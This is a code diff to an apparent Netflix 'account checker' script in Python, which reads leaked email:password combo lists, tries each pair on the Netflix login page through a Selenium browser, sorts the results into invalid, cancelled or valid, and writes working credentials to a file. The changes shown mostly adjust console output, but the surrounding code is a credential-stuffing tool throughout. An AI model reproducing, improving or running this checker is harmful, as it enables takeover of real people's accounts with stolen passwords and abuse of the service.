@@ -45,7 +45,7 @@ for file_ in range(len(files)):
 			for line in net.readlines():
 				if details[2] in line:
 					user.append(line.split(":")[0])
-					passw.append(line.split(":")[1].split(current_split_method)[0])
+					passw.append(line.split(":")[1].split(current_split_method)[0].strip())
 				else:
 					user.append(line.split(":")[0])
 					passw.append(line.split(":")[1])
@@ -58,8 +58,7 @@ page = "https://www.netflix.com/login"
 
 while counter < len(user):
 	try:
-		print("\033[38;5;7mConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m|".format(str(counter), user[counter], passw[counter].strip()),end='')	
-		#Clear Terminal after n accounts
+		print("\033[38;5;7m\nConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(str(counter), user[counter], passw[counter].strip()),end='')
 
 		#Account Checker
 		browser_options = Options()
@@ -82,16 +81,16 @@ while counter < len(user):
 		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'):
 			login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
 			if "Sorry, we can't find an account with this email address." in login_error:
-				print("\033[38;5;7m Result = \033[38;5;196m Invalid Email")
+				print("\033[38;5;196m Invalid Email",end='\n')
 
 			if "Incorrect password" in login_error:
-				print("\033[38;5;7m Result = \033[38;5;196m Invalid Password")
+				print("\033[38;5;196m Invalid Password",end='\n')
 
 		if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
-			print("\033[38;5;226m Result = \033[38;5;196m Account Cancelled")
+			print("\033[38;5;196m Account Cancelled",end='')
 
 		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
-			print("\033[38;5;7m Result = \033[38;5;46m Valid Account - Stored")
+			print("\033[38;5;46m Valid Account - Stored",end='\n')
 			with open('valid','a') as valid:
 				valid.write("{}:{}\n".format(user[counter],passw[counter]))
 		
